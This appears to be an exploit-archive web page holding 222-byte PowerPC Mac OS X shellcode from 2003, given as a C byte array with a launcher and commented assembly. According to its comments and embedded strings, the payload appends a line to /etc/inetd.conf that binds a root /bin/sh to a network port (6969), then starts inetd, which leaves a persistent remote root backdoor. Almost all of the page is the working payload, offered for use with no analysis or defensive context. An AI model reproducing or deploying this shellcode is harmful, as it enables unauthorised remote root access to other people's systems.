<html><head><title>Osx/ppc - add inetd backdoor - 222 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
PPC OS X / Darwin Shellcode by B-r00t. 2003.
open(); write(); close(); execve(); exit();
See ASM below.
222 Bytes!
*/

char shellcode[] =
&quot;\x7c\xa5\x2a\x79\x40\x82\xff\xfd\x7d\x48\x02\xa6\x3b\xea\x01\x70&quot;
&quot;\x39\x60\x01\x70\x39\x1f\xff\x1b\x7c\xa8\x29\xae\x39\x1f\xff\x65&quot;
&quot;\x7c\xa8\x29\xae\x38\x7f\xff\x0c\x38\x8b\xfe\x99\x38\xa0\xff\xff&quot;
&quot;\x38\x0b\xfe\x95\x44\xff\xff\x02\x60\x60\x60\x60\x38\x9f\xff\x1c&quot;
&quot;\x38\xab\xfe\xca\x38\x0b\xfe\x94\x44\xff\xff\x02\x60\x60\x60\x60&quot;
&quot;\x38\x0b\xfe\x96\x44\xff\xff\x02\x60\x60\x60\x60\x7c\xa5\x2a\x79&quot;
&quot;\x38\x7f\xff\x56\x90\x61\xff\xf8\x90\xa1\xff\xfc\x38\x81\xff\xf8&quot;
&quot;\x38\x0b\xfe\xcb\x44\xff\xff\x02\x60\x60\x60\x60\x38\x0b\xfe\x91&quot;
&quot;\x44\xff\xff\x02\x2f\x65\x74\x63\x2f\x69\x6e\x65\x74\x64\x2e\x63&quot;
&quot;\x6f\x6e\x66\x58\x0a\x61\x63\x6d\x73\x6f\x64\x61\x20\x73\x74\x72&quot;
&quot;\x65\x61\x6d\x20\x74\x63\x70\x20\x6e\x6f\x77\x61\x69\x74\x20\x72&quot;
&quot;\x6f\x6f\x74\x20\x2f\x75\x73\x72\x2f\x6c\x69\x62\x65\x78\x65\x63&quot;
&quot;\x2f\x74\x63\x70\x64\x20\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x2f\x75&quot;
&quot;\x73\x72\x2f\x73\x62\x69\x6e\x2f\x69\x6e\x65\x74\x64\x58&quot;;

int main (void) 
{
        __asm__(&quot;b _shellcode&quot;);
}

/*
; PPC OS X / Darwin Shellcode by B-r00t. 
; open(); write(); close(); execve(); exit()
; Appends a backdoor (port 6969 rootshell) line into 
; '/etc/inetd.conf' and executes '/usr/sbin/inetd'.
; Commands MUST end with ';' ie. uname -a;
;
.globl _main
.text
_main:
        xor.    r5, r5, r5
        bnel    _main                    
        mflr    r10
	addi	r31, r10, 368
	li      r11, 368
        addi    r8, r31, -229 
        stbx    r5, r8, r5
        addi    r8, r31, -155 
        stbx    r5, r8, r5
        addi    r3, r31, -244
	addi    r4, r11, -359
        li      r5, -1  
        addi    r0, r11, -363 
        .long   0x44ffff02
        .long   0x60606060
        addi    r4, r31, -228 
        addi    r5, r11, -310
        addi    r0, r11, -364
        .long   0x44ffff02
        .long   0x60606060
        addi    r0, r11, -362
        .long   0x44ffff02      
        .long   0x60606060
        xor.    r5, r5, r5
        addi    r3, r31, -170          
        stw     r3, -8(r1)      
        stw     r5, -4(r1)      
        subi    r4, r1, 8       
        addi     r0, r11, -309             
        .long   0x44ffff02      
        .long   0x60606060
        addi    r0, r11, -367
        .long   0x44ffff02
path:   .asciz  &quot;/etc/inetd.confX\nacmsoda stream tcp nowait root /usr/libexec/tcpd /bin/sh\n/usr/sbin/inetdX&quot;

*/



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
